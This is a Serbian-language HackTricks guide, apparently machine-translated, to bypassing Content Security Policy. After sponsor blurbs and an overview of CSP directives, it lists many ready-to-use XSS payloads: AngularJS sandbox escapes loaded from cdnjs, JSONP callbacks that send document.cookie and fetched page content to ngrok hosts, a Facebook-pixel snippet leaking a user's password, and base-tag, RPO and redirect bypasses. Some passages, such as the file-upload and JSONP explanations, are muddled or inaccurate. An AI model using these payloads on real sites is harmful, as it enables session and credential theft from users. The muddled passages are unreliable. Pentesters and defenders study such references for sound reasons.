# Bypassovanje politike bezbednosti sadrÅ¾aja (CSP)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

PridruÅ¾ite se [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) serveru kako biste komunicirali sa iskusnim hakerima i lovcima na bagove!

**Uvidi u hakovanje**\
UkljuÄite se u sadrÅ¾aj koji istraÅ¾uje uzbuÄ‘enje i izazove hakovanja

**Vesti o hakovanju u realnom vremenu**\
Budite u toku sa brzim svetom hakovanja kroz vesti i uvide u realnom vremenu

**Najnovije objave**\
Budite informisani o najnovijim pokretanjima nagrada za pronalaÅ¾enje bagova i vaÅ¾nim aÅ¾uriranjima platforme

**PridruÅ¾ite nam se na** [**Discord-u**](https://discord.com/invite/N3FrSbmwdy) i poÄnite da saraÄ‘ujete sa vrhunskim hakerima danas!

## Å ta je CSP

Politika bezbednosti sadrÅ¾aja (CSP) je prepoznata kao tehnologija pregledaÄa, pre svega namenjena **zaÅ¡titi od napada kao Å¡to je cross-site scripting (XSS)**. Ona funkcioniÅ¡e tako Å¡to definiÅ¡e i detaljno opisuje putanje i izvore sa kojih pregledaÄ moÅ¾e bezbedno uÄitavati resurse. Ovi resursi obuhvataju razne elemente kao Å¡to su slike, okviri i JavaScript. Na primer, politika moÅ¾e dozvoliti uÄitavanje i izvrÅ¡avanje resursa sa istog domena (self), ukljuÄujuÄ‡i inline resurse i izvrÅ¡avanje string koda putem funkcija poput `eval`, `setTimeout` ili `setInterval`.

Implementacija CSP-a se vrÅ¡i putem **odgovora zaglavlja** ili ukljuÄivanjem **meta elemenata u HTML stranicu**. Nakon primene ove politike, pregledaÄi proaktivno sprovode ove odredbe i odmah blokiraju svako otkriveno krÅ¡enje.

- Implementirano putem zaglavlja odgovora:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Implementirano putem meta oznake:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Zaglavlja

CSP se moÅ¾e primeniti ili pratiti pomoÄ‡u ovih zaglavlja:

* `Content-Security-Policy`: Primenjuje CSP; pregledaÄ blokira svako krÅ¡enje pravila.
* `Content-Security-Policy-Report-Only`: Koristi se za praÄ‡enje; prijavljuje krÅ¡enja pravila bez blokiranja. Idealno za testiranje u pre-produkcionim okruÅ¾enjima.

### Definisanje resursa

CSP ograniÄava poreklo za uÄitavanje aktivnog i pasivnog sadrÅ¾aja, kontroliÅ¡uÄ‡i aspekte kao Å¡to su izvrÅ¡avanje inline JavaScript koda i koriÅ¡Ä‡enje `eval()`. Primer politike je:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Direktive

* **script-src**: Dozvoljava odreÄ‘ene izvore za JavaScript, ukljuÄujuÄ‡i URL-ove, inline skripte i skripte pokrenute putem event handlera ili XSLT stilova.
* **default-src**: Postavlja podrazumevanu politiku za preuzimanje resursa kada odreÄ‘ene direktive za preuzimanje nisu prisutne.
* **child-src**: OdreÄ‘uje dozvoljene resurse za web radnike i ugraÄ‘eni sadrÅ¾aj okvira.
* **connect-src**: OgraniÄava URL-ove koji se mogu uÄitati koristeÄ‡i interfejse poput fetch, WebSocket, XMLHttpRequest.
* **frame-src**: OgraniÄava URL-ove za okvire.
* **frame-ancestors**: OdreÄ‘uje koji izvori mogu ugraditi trenutnu stranicu, primenjivo na elemente poput `<frame>`, `<iframe>`, `<object>`, `<embed>` i `<applet>`.
* **img-src**: DefiniÅ¡e dozvoljene izvore za slike.
* **font-src**: OdreÄ‘uje validne izvore za fontove koji se uÄitavaju koristeÄ‡i `@font-face`.
* **manifest-src**: DefiniÅ¡e dozvoljene izvore manifestnih fajlova aplikacije.
* **media-src**: DefiniÅ¡e dozvoljene izvore za uÄitavanje medijskih objekata.
* **object-src**: DefiniÅ¡e dozvoljene izvore za elemente `<object>`, `<embed>` i `<applet>`.
* **base-uri**: OdreÄ‘uje dozvoljene URL-ove za uÄitavanje koristeÄ‡i elemente `<base>`.
* **form-action**: Navodi validne endpointe za slanje formi.
* **plugin-types**: OgraniÄava mime tipove koje stranica moÅ¾e pozvati.
* **upgrade-insecure-requests**: InstruiÅ¡e pretraÅ¾ivaÄe da prepiÅ¡u HTTP URL-ove u HTTPS.
* **sandbox**: Primjenjuje ograniÄenja sliÄna atributu sandbox `<iframe>`.
* **report-to**: OdreÄ‘uje grupu kojoj Ä‡e biti poslat izveÅ¡taj ako politika bude prekrÅ¡ena.
* **worker-src**: OdreÄ‘uje validne izvore za Worker, SharedWorker ili ServiceWorker skripte.
* **prefetch-src**: OdreÄ‘uje validne izvore za resurse koji Ä‡e biti preuzeti ili predpreuzeti.
* **navigate-to**: OgraniÄava URL-ove na koje dokument moÅ¾e navigirati putem bilo kojeg sredstva (a, form, window.location, window.open, itd.)


### Izvori

* `*`: Dozvoljava sve URL-ove osim onih sa Å¡emama `data:`, `blob:`, `filesystem:`.
* `'self'`: Dozvoljava uÄitavanje sa istog domena.
* `'data'`: Dozvoljava uÄitavanje resursa putem data Å¡eme (npr. Base64 kodirane slike).
* `'none'`: Blokira uÄitavanje sa bilo kog izvora.
* `'unsafe-eval'`: Dozvoljava upotrebu `eval()` i sliÄnih metoda, nije preporuÄljivo iz bezbednosnih razloga.
* `'unsafe-hashes'`: OmoguÄ‡ava odreÄ‘ene inline event handlere.
* `'unsafe-inline'`: Dozvoljava upotrebu inline resursa poput inline `<script>` ili `<style>`, nije preporuÄljivo iz bezbednosnih razloga.
* `'nonce'`: Bela lista za odreÄ‘ene inline skripte koristeÄ‡i kriptografski nonce (broj koji se koristi samo jednom).
* `'sha256-<hash>'`: Bela lista skripti sa odreÄ‘enim sha256 heÅ¡om.
* `'strict-dynamic'`: Dozvoljava uÄitavanje skripti sa bilo kog izvora ako je bela lista napravljena pomoÄ‡u nonce-a ili heÅ¡a.
* `'host'`: OdreÄ‘uje odreÄ‘eni host, poput `example.com`.
* `https:`: OgraniÄava URL-ove na one koji koriste HTTPS.
* `blob:`: Dozvoljava uÄitavanje resursa sa Blob URL-ova (npr. Blob URL-ovi kreirani putem JavaScript-a).
* `filesystem:`: Dozvoljava uÄitavanje resursa sa fajl sistema.
* `'report-sample'`: UkljuÄuje uzorak koda koji je prekrÅ¡io pravilo u izveÅ¡taju o prekrÅ¡aju (korisno za debagovanje).
* `'strict-origin'`: SliÄno kao 'self', ali osigurava da nivo sigurnosti protokola izvora odgovara dokumentu (samo sigurni izvori mogu uÄitavati resurse sa sigurnih izvora).
* `'strict-origin-when-cross-origin'`: Å alje pun URL kada se vrÅ¡e zahtevi sa istog izvora, ali Å¡alje samo poreklo kada je zahtev sa razliÄitog izvora.
* `'unsafe-allow-redirects'`: Dozvoljava uÄitavanje resursa koji Ä‡e odmah preusmeriti na drugi resurs. Nije preporuÄljivo jer oslabljuje bezbednost.


## Nesigurna CSP pravila

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Radni payload: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' putem Iframe-a

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Radna payload:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Ako na neki naÄin moÅ¾ete da napravite da **dozvoljeni JS kod kreira novi script tag** u DOM-u sa vaÅ¡im JS kodom, jer ga kreira dozvoljeni skript, **novi script tag Ä‡e biti dozvoljen za izvrÅ¡avanje**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Radna payload:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Nedostatak object-src i default-src

{% hint style="danger" %}
**Izgleda da ovo viÅ¡e ne funkcioniÅ¡e**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Radne payload-ove:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Slanje datoteka + 'self'

Kada se koristi Content Security Policy (CSP) sa direktivom `'self'`, samo skripte i resursi sa istog izvora kao i veb stranica mogu se izvrÅ¡avati ili uÄitavati. MeÄ‘utim, ova direktiva moÅ¾e biti zaobiÄ‘ena kada se koristi funkcionalnost slanja datoteka.

Da biste iskoristili ovu ranjivost, moÅ¾ete postaviti zlonamernu skriptu na veb stranicu koja omoguÄ‡ava slanje datoteka. Kada korisnik izabere datoteku za slanje, skripta moÅ¾e iskoristiti ovu priliku da izvrÅ¡i zlonamerni kod.

Na primer, moÅ¾ete postaviti sledeÄ‡i HTML kod na veb stranicu:

```html
<form action="https://www.example.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file">
  <input type="submit" value="Upload">
</form>
```

Kada korisnik izabere datoteku i klikne na dugme "Upload", datoteka Ä‡e biti poslata na `https://www.example.com/upload`. MeÄ‘utim, ako je CSP postavljen na `'self'`, skripta sa iste veb stranice moÅ¾e biti izvrÅ¡ena prilikom slanja datoteke.

Ova ranjivost moÅ¾e biti iskoriÅ¡Ä‡ena za izvrÅ¡avanje zlonamernog koda na veb stranici i zaobilaÅ¾enje CSP direktive `'self'`.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Ako moÅ¾ete da otpremite JS fajl, moÅ¾ete zaobiÄ‡i ovu CSP:

Ispravan payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
MeÄ‘utim, vrlo je verovatno da server **validira otpremljeni fajl** i dozvoljava samo **odreÄ‘ene vrste fajlova** za otpremanje.

Osim toga, Äak i ako biste mogli otpremiti **JS kod unutar** fajla koristeÄ‡i ekstenziju koju server prihvata (na primer: _script.png_), to neÄ‡e biti dovoljno jer neki serveri poput Apache servera **biraju MIME tip fajla na osnovu ekstenzije**, a pregledaÄi poput Chrome-a Ä‡e **odbijati izvrÅ¡avanje JavaScript koda** unutar neÄega Å¡to bi trebalo da bude slika. "Na sreÄ‡u", postoje greÅ¡ke. Na primer, iz jednog CTF-a sam nauÄio da **Apache ne prepoznaje** ekstenziju _**.wave**_, pa je ne servira sa MIME tipom kao Å¡to je audio/\*.

Odavde, ako pronaÄ‘ete XSS i otpremanje fajla, i uspete da pronaÄ‘ete **pogreÅ¡no protumaÄenu ekstenziju**, moÅ¾ete pokuÅ¡ati da otpremite fajl sa tom ekstenzijom i sadrÅ¾ajem skripte. Ili, ako server proverava ispravan format otpremljenog fajla, moÅ¾ete kreirati poliglot ([neki primeri poliglota ovde](https://github.com/Polydet/polyglot-database)).

### Spoljni endpointi + ('unsafe-eval')

{% hint style="warning" %}
Za neke od sledeÄ‡ih payloada **`unsafe-eval` Äak nije ni potreban**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
UÄitajte ranjivu verziju Angulara i izvrÅ¡ite proizvoljni JS kod:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloadi koji koriste Angular + biblioteku sa funkcijama koje vraÄ‡aju `window` objekat ([proÄitajte ovaj post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Post pokazuje da moÅ¾ete **uÄitati** sve **biblioteke** sa `cdn.cloudflare.com` (ili bilo kojeg drugog dozvoljenog repozitorijuma JS biblioteka), izvrÅ¡iti sve dodate funkcije iz svake biblioteke i proveriti **koje funkcije iz kojih biblioteka vraÄ‡aju `window` objekat**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Zloupotreba google recaptcha JS koda

Prema [**ovom CTF izveÅ¡taju**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), moÅ¾ete zloupotrebiti [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) unutar CSP-a da biste izvrÅ¡ili proizvoljni JS kod zaobilaÅ¾enjem CSP-a:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### TreÄ‡e strane krajnje taÄke + JSONP

#### Opis

Content Security Policy (CSP) je mehanizam koji pomaÅ¾e u spreÄavanju Cross-Site Scripting (XSS) napada ograniÄavajuÄ‡i izvor resursa koji se mogu uÄitati na veb stranici. MeÄ‘utim, CSP moÅ¾e biti zaobiÄ‘en koriÅ¡Ä‡enjem treÄ‡ih strana krajnjih taÄaka i JSONP (JSON with Padding) tehnike.

#### Kako to radi?

Kada CSP politika dozvoljava koriÅ¡Ä‡enje treÄ‡ih strana krajnjih taÄaka, moÅ¾e se iskoristiti JSONP tehnika za zaobilaÅ¾enje CSP ograniÄenja. JSONP je tehnika koja omoguÄ‡ava uÄitavanje resursa sa drugog domena tako Å¡to se koristi `<script>` tag. Kada se koristi JSONP, zahtev se Å¡alje na treÄ‡u stranu krajnju taÄku koja vraÄ‡a odgovor u JSON formatu, ali umotan u funkciju koja se definiÅ¡e na veb stranici. Na taj naÄin, odgovor se tretira kao izvrÅ¡ivi JavaScript kod i moÅ¾e se pristupiti podacima koje sadrÅ¾i.

#### Primer

Pretpostavimo da je CSP politika postavljena na sledeÄ‡i naÄin:

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://api.example.com;
```

U ovom sluÄaju, samo skripte sa sopstvenog domena i sa `https://api.example.com` Ä‡e biti dozvoljene. MeÄ‘utim, ako je treÄ‡a strana krajnja taÄka `https://api.example.com` konfigurisana da podrÅ¾ava JSONP, moÅ¾e se iskoristiti za zaobilaÅ¾enje CSP politike.

Na primer, ako postoji sledeÄ‡i kod na veb stranici:

```html
<script>
    function handleResponse(data) {
        // Manipulacija podacima
    }
</script>

<script src="https://api.example.com/data?callback=handleResponse"></script>
```

Kada se ovaj kod izvrÅ¡i, zahtev Ä‡e biti poslat na `https://api.example.com/data` sa parametrom `callback=handleResponse`. TreÄ‡a strana krajnja taÄka Ä‡e vratiti odgovor u JSON formatu, ali umotan u funkciju `handleResponse`. Na taj naÄin, odgovor Ä‡e biti izvrÅ¡en kao JavaScript kod i funkcija `handleResponse` Ä‡e biti pozvana sa podacima kao argumentom.

#### Mitigacija

Da bi se spreÄilo zaobilaÅ¾enje CSP politike putem treÄ‡ih strana krajnjih taÄaka i JSONP tehnike, treba paÅ¾ljivo konfigurisati CSP politiku i ograniÄiti dozvoljene izvore skripti. TakoÄ‘e, treba izbegavati koriÅ¡Ä‡enje JSONP tehnike i umesto toga koristiti sigurnije alternative kao Å¡to su JSON Web Tokens (JWT) ili Cross-Origin Resource Sharing (CORS).
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenariji poput ovog, gde je `script-src` podeÅ¡en na `self` i odreÄ‘enu domenu koja je na beloj listi, mogu se zaobiÄ‡i koriÅ¡Ä‡enjem JSONP-a. JSONP endpointi omoguÄ‡avaju nesigurne povratne metode koje omoguÄ‡avaju napadaÄu da izvrÅ¡i XSS, radni payload:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **sadrÅ¾i spremne JSONP endpointe za CSP zaobilaÅ¾enje razliÄitih web stranica.**

Ista ranjivost Ä‡e se pojaviti ako **pouzdani endpoint sadrÅ¾i otvoreno preusmeravanje** jer ako je poÄetni endpoint pouzdan, preusmeravanja su pouzdana.

### Zloupotrebe treÄ‡ih strana
Kao Å¡to je opisano u [sledeÄ‡em postu](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), postoji mnogo domena treÄ‡ih strana koje mogu biti dozvoljene negde u CSP-u, a mogu se zloupotrebiti kako bi se izvrÅ¡io JavaScript kod ili izvrÅ¡io izvlaÄenje podataka. Neki od ovih treÄ‡ih strana su:

| Entitet | Dozvoljeni domen | MoguÄ‡nosti |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | IzvlaÄenje |
| Hotjar | *.hotjar.com, ask.hotjar.io | IzvlaÄenje |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | IzvrÅ¡avanje |
| Amazon CloudFront | *.cloudfront.net | IzvlaÄenje, IzvrÅ¡avanje |
| Amazon AWS | *.amazonaws.com | IzvlaÄenje, IzvrÅ¡avanje |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | IzvlaÄenje, IzvrÅ¡avanje |
| Salesforce Heroku	| *.herokuapp.com | IzvlaÄenje, IzvrÅ¡avanje |
| Google Firebase | *.firebaseapp.com | IzvlaÄenje, IzvrÅ¡avanje |

Ako pronaÄ‘ete neki od dozvoljenih domena u CSP-u vaÅ¡e mete, postoji moguÄ‡nost da moÅ¾ete zaobiÄ‡i CSP registracijom na uslugu treÄ‡e strane i izvrÅ¡iti izvlaÄenje podataka na tu uslugu ili izvrÅ¡iti kod.

Na primer, ako pronaÄ‘ete sledeÄ‡i CSP:
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
ili
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
Trebali biste moÄ‡i da izfiltrirate podatke, sliÄno kao Å¡to je to uvek raÄ‘eno sa [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). U ovom sluÄaju, pratite ove opÅ¡te korake:

1. Kreirajte Facebook Developer nalog ovde.
1. Napravite novu "Facebook Login" aplikaciju i izaberite "Website".
1. Idite na "Settings -> Basic" i dobijte svoj "App ID".
1. Na ciljnoj stranici sa koje Å¾elite da izfiltrirate podatke, moÅ¾ete to uraditi direktno koristeÄ‡i Facebook SDK ureÄ‘aj "fbq" putem "customEvent" i podataka za prenos.
1. Idite na "Event Manager" vaÅ¡e aplikacije i izaberite aplikaciju koju ste kreirali (napomena: event manager se moÅ¾e pronaÄ‡i na URL-u sliÄnom ovom: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events).
1. Izaberite karticu "Test Events" da biste videli dogaÄ‘aje koje Å¡alje "vaÅ¡" veb sajt.

Zatim, na strani Å¾rtve, izvrÅ¡ite sledeÄ‡i kod da biste inicijalizovali Facebook tracking piksel koji Ä‡e upuÄ‡ivati na napadaÄev Facebook developer nalog app-id i izdati prilagoÄ‘eni dogaÄ‘aj kao Å¡to je ovaj:
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
Å to se tiÄe ostalih sedam treÄ‡ih domena navedenih u prethodnoj tabeli, postoji mnogo drugih naÄina na koje ih moÅ¾ete zloupotrebiti. Pogledajte prethodni [blog post](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) za dodatna objaÅ¡njenja o drugim zloupotrebama treÄ‡ih strana.

### Bypass putem RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Pored pomenutog preusmeravanja za zaobilaÅ¾enje ograniÄenja putanje, postoji joÅ¡ jedna tehnika koja se naziva Relative Path Overwrite (RPO) koja se moÅ¾e koristiti na nekim serverima.

Na primer, ako CSP dozvoljava putanju `https://example.com/scripts/react/`, moÅ¾e se zaobiÄ‡i na sledeÄ‡i naÄin:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Preglednik Ä‡e na kraju uÄitati `https://example.com/scripts/angular/angular.js`.

Ovo radi zato Å¡to preglednik uÄitava datoteku nazvanu `..%2fangular%2fangular.js` koja se nalazi pod `https://example.com/scripts/react/`, Å¡to je u skladu sa CSP-om.

MeÄ‘utim, preglednik Ä‡e to dekodirati i zapravo zatraÅ¾iti `https://example.com/scripts/react/../angular/angular.js`, Å¡to je ekvivalentno `https://example.com/scripts/angular/angular.js`.

IskoriÅ¡tavanjem ove neusklaÄ‘enosti u tumaÄenju URL-a izmeÄ‘u preglednika i servera, pravila putanje mogu se zaobiÄ‡i.

RjeÅ¡enje je da se na serverskoj strani ne tretira `%2f` kao `/`, kako bi se osiguralo dosljedno tumaÄenje izmeÄ‘u preglednika i servera i izbjegao ovaj problem.

Online primjer: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### IzvrÅ¡avanje JS koda putem iframe-a

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### Nedostaje **base-uri**

Ako nedostaje direktiva **base-uri**, moÅ¾e se zloupotrijebiti za izvoÄ‘enje [**dangling markup injection**](../dangling-markup-html-scriptless-injection/).

Osim toga, ako se **stranica uÄitava skriptom koristeÄ‡i relativnu putanju** (poput `<script src="/js/app.js">`) koristeÄ‡i **Nonce**, moÅ¾e se zloupotrijebiti **base** **tag** kako bi se skripta **uÄitala** s **vlastitog servera i postigao XSS**.
Ako se ranjiva stranica uÄitava s **httpS**, koristite httpS URL u base tagu.
```html
<base href="https://www.attacker.com/">
```
### AngularJS dogaÄ‘aji

SpecifiÄna politika poznata kao Content Security Policy (CSP) moÅ¾e ograniÄiti JavaScript dogaÄ‘aje. MeÄ‘utim, AngularJS uvodi prilagoÄ‘ene dogaÄ‘aje kao alternativu. U okviru dogaÄ‘aja, AngularJS pruÅ¾a jedinstveni objekat `$event`, koji se odnosi na ugraÄ‘eni objekat dogaÄ‘aja u pregledaÄu. Ovaj `$event` objekat moÅ¾e biti iskoriÅ¡Ä‡en za zaobilaÅ¾enje CSP-a. Posebno, u Chrome-u, `$event/event` objekat poseduje atribut `path`, koji sadrÅ¾i niz objekata koji su ukljuÄeni u lanac izvrÅ¡enja dogaÄ‘aja, pri Äemu je objekat `window` uvek na kraju. Ova struktura je kljuÄna za taktike bekstva iz peska.

Usmeravanjem ovog niza na `orderBy` filter, moguÄ‡e je iterirati kroz njega, koristeÄ‡i terminalni element (objekat `window`) da pokrene globalnu funkciju poput `alert()`. Demonstrirani kod ispod objaÅ¡njava ovaj proces:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ovaj odlomak istiÄe upotrebu `ng-focus` direktive za pokretanje dogaÄ‘aja, koriÅ¡Ä‡enje `$event.path|orderBy` za manipulaciju niza `path`, i iskoriÅ¡Ä‡avanje objekta `window` za izvrÅ¡avanje funkcije `alert()`, Äime se otkriva `document.cookie`.

**PronaÄ‘ite druge naÄine zaobilaÅ¾enja u Angularu na** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS i dozvoljena domena
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
CSP politika koja beleÅ¾i domene za uÄitavanje skripti u Angular JS aplikaciji moÅ¾e biti zaobiÄ‘ena putem pozivanja povratnih funkcija i odreÄ‘enih ranjivih klasa. Dodatne informacije o ovoj tehnici mogu se pronaÄ‡i u detaljnom vodiÄu dostupnom na ovom [git repozitorijumu](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).


Radne payloade:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Drugi JSONP proizvoljni izvrÅ¡ni krajnji bodovi mogu se pronaÄ‡i [ovde](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (neki od njih su obrisani ili popravljeni)

### ZaobilaÅ¾enje putem preusmeravanja

Å ta se deÅ¡ava kada CSP naiÄ‘e na preusmeravanje na serverskoj strani? Ako preusmeravanje vodi ka drugom poreklu koje nije dozvoljeno, i dalje Ä‡e neuspeti.

MeÄ‘utim, prema opisu u [CSP specifikaciji 4.2.2.3. Putanje i preusmeravanja](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), ako preusmeravanje vodi ka drugoj putanji, moÅ¾e zaobiÄ‡i originalna ograniÄenja.

Evo primera:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Ako je CSP postavljen na `https://www.google.com/a/b/c/d`, s obzirom da se putanja uzima u obzir, i skripte `/test` i `/a/test` Ä‡e biti blokirane od strane CSP.

MeÄ‘utim, konaÄni `http://localhost:5555/301` Ä‡e biti **preusmeren na serverskoj strani na `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. S obzirom da je to preusmerenje, **putanja se ne uzima u obzir**, i **skripta moÅ¾e biti uÄitana**, Äime se zaobilazi ograniÄenje putanje.

